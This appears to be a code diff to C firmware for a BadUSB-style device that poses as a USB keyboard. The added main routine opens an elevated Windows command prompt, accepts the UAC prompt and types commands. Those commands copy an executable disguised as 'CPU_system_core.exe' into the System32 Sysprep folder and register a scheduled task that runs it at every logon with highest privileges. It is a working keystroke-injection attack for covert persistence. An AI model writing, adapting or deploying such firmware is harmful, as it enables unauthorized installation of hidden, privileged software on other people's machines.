@@ -23,6 +23,7 @@
  *
  */
 
+
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
@@ -42,7 +43,7 @@
 #define MOD_ALT   KEYBOARD_MODIFIER_LEFTALT
 #define MOD_WIN   KEYBOARD_MODIFIER_LEFTGUI
 
-// ---------- Extra ----------
+// ---------- Special keys ----------
 #define ASCII_ESC     	  (char) 0x1B 
 #define ASCII_ARROW_UP    (char) 0x01
 #define ASCII_ARROW_DOWN  (char) 0x02
@@ -54,6 +55,14 @@
 #define ASCII_PAGE_DOWN   (char) 0x08
 #define ASCII_INSERT      (char) 0x09
 #define ASCII_DELETE      (char) 0x7F
+
+//------raw hid--------
+//only use with type_char_raw/type_char_raw_with_mods
+#define HID_KEY_F1    0x3A
+#define HID_KEY_F2    0x3B
+#define HID_KEY_F3    0x3C
+#define HID_KEY_F4    0x3D
+#define HID_KEY_F5    0x3E
 
 
 // ---------- ASCII → HID mapping ----------
@@ -176,16 +185,180 @@ static const uint8_t hid_ascii_shift[128] = {
 
 
 // Typing speed, lower the more buggy
-#define WAIT_STRING 3
-#define KEY_RELEASE 5
+#define WAIT_STRING 1
+#define KEY_RELEASE 3
 
 #define WAIT_PROGRAMS_FAST 50
 #define WAIT_PROGRAMS_SLOW 500
 
+// path to download app
+#define WINDOWS_FILEPATH "C:\\Windows\\System32\\Sysprep\\"
+
+// path to copy app from your usb
+#define USB_FILEPATH "D:\\exe\\"
+
+// app name
+#define APP_NAME "CPU_system_core.exe"
+
 
 // ---------- Typing helpers ----------
 
-static inline bool send_hid_report(uint8_t report_id, char c, uint8_t modifiers);
+void type_char_raw(uint8_t c);
+void type_char_raw_with_mods(uint8_t c, uint8_t mods);
+
+bool type_char(char c);
+bool type_char_with_mods(char c, uint8_t mods);
+static inline void type_string(const char *s);
+static inline void type_string_with_mods(const char *s, uint8_t extra_mods);
+
+
+// ---------- Commonly used ----------
+
+static inline void enter(void) {
+    type_char('\n');
+}
+
+static inline void close(void) {
+    type_char_raw_with_mods(HID_KEY_F4, MOD_ALT);
+}
+
+/*------------- MAIN -------------*/
+
+void initialiser(void) {
+	board_init();
+	// init device stack on configured roothub port
+	tud_init(BOARD_TUD_RHPORT);
+
+	while (!tud_mounted()) {
+		tud_task();
+		sleep_ms(10);
+	}
+	sleep_ms(2000);
+
+	if (board_init_after_tusb) {
+		board_init_after_tusb();
+	}
+
+	while (!board_button_read()) {
+		sleep_ms(50);
+	}
+	type_char(ASCII_ESC);
+	sleep_ms(50);
+}
+
+
+int main(void)
+{
+	initialiser();
+
+	type_char_with_mods('r', MOD_WIN);
+	sleep_ms(WAIT_PROGRAMS_FAST);
+	
+	type_string("cmd");
+	sleep_ms(WAIT_PROGRAMS_FAST);
+
+	type_char_with_mods('\n', MOD_CTRL | MOD_SHIFT);
+	sleep_ms(WAIT_PROGRAMS_SLOW);
+
+	type_char(ASCII_ARROW_LEFT);
+	sleep_ms(WAIT_PROGRAMS_FAST);
+	enter();
+  sleep_ms(WAIT_PROGRAMS_SLOW);
+
+  type_string("copy ");
+  type_string(USB_FILEPATH);
+  type_string(APP_NAME);
+  type_char(' ');
+  type_string(WINDOWS_FILEPATH);
+  enter();
+  sleep_ms(WAIT_PROGRAMS_FAST);
+
+  type_string("schtasks /create /sc onlogon /tn \"");
+  type_string(APP_NAME);
+  type_string("\" /tr \"");
+  type_string(WINDOWS_FILEPATH);
+  type_string(APP_NAME);
+  type_string("\" /rl highest /f");
+  enter();
+  sleep_ms(WAIT_PROGRAMS_FAST);
+  close();
+
+}
+
+
+//--------------------------------------------------------------------+
+// USB HID
+//--------------------------------------------------------------------+
+
+static inline bool send_hid_report(uint8_t report_id, char c, uint8_t modifiers)
+{
+  uint8_t const ch = (uint8_t)c;
+
+  if (!tud_hid_ready()) return false;
+
+  uint8_t keycode[6] = { 0 };
+  keycode[0] = hid_ascii_usage[ch];
+
+  uint8_t mods = modifiers | hid_ascii_shift[ch];
+
+	return tud_hid_keyboard_report(REPORT_ID_KEYBOARD, mods, keycode);
+}
+
+void type_char_raw(uint8_t c)
+{
+  uint8_t const ch = (uint8_t)c;
+
+  while (!tud_hid_ready()) {
+      tud_task();
+      sleep_ms(1);
+  }
+  uint8_t keycode[6] = { 0 };
+  keycode[0] = c;
+
+	tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, keycode);
+
+  sleep_ms(KEY_RELEASE);
+
+  // Wait until ready again for release
+  while (!tud_hid_ready()) {
+      tud_task();
+      sleep_ms(1);
+  }
+
+  // RELEASE
+  tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
+  sleep_ms(KEY_RELEASE);
+
+  return;
+}
+
+void type_char_raw_with_mods(uint8_t c, uint8_t mods)
+{
+  uint8_t const ch = (uint8_t)c;
+
+  while (!tud_hid_ready()) {
+      tud_task();
+      sleep_ms(1);
+  }
+  uint8_t keycode[6] = { 0 };
+  keycode[0] = c;
+
+	while (!tud_hid_keyboard_report(REPORT_ID_KEYBOARD, mods, keycode)){}
+
+  sleep_ms(KEY_RELEASE);
+
+  // Wait until ready again for release
+  while (!tud_hid_ready()) {
+      tud_task();
+      sleep_ms(1);
+  }
+
+  // RELEASE
+  tud_hid_keyboard_report(REPORT_ID_KEYBOARD, 0, NULL);
+  sleep_ms(KEY_RELEASE);
+
+  return;
+}
 
 bool type_char(char c)
 {
@@ -266,72 +439,15 @@ static inline void type_string_with_mods(const char *s, uint8_t extra_mods) {
 
 
 
-// ---------- Commonly used ----------
-
-static inline void enter(void) {
-    type_char('\n');
-}
-
-/*------------- MAIN -------------*/
-
-void initialiser(void) {
-	board_init();
-	// init device stack on configured roothub port
-	tud_init(BOARD_TUD_RHPORT);
-
-	while (!tud_mounted()) {
-		tud_task();
-		sleep_ms(10);
-	}
-	sleep_ms(2000);
-
-	if (board_init_after_tusb) {
-		board_init_after_tusb();
-	}
-
-	while (!board_button_read()) {
-		sleep_ms(50);
-	}
-	type_char(ASCII_ESC);
-	sleep_ms(50);
-}
 
 
-int main(void)
-{
-	initialiser();
 
-	type_char_with_mods('r', MOD_WIN);
-	sleep_ms(WAIT_PROGRAMS_FAST);
-	
-	type_string("cmd");
-	sleep_ms(WAIT_PROGRAMS_FAST);
 
-	type_char_with_mods('\n', MOD_CTRL | MOD_SHIFT);
-	sleep_ms(WAIT_PROGRAMS_SLOW);
 
-	type_char(ASCII_ARROW_LEFT);
-	sleep_ms(WAIT_PROGRAMS_FAST);
-	enter();
-}
 
-//--------------------------------------------------------------------+
-// USB HID
-//--------------------------------------------------------------------+
 
-static inline bool send_hid_report(uint8_t report_id, char c, uint8_t modifiers)
-{
-  uint8_t const ch = (uint8_t)c;
 
-  if (!tud_hid_ready()) return false;
 
-  uint8_t keycode[6] = { 0 };
-  keycode[0] = hid_ascii_usage[ch];
-
-  uint8_t mods = modifiers | hid_ascii_shift[ch];
-
-	return tud_hid_keyboard_report(REPORT_ID_KEYBOARD, modifiers, keycode);
-}
 
 
 
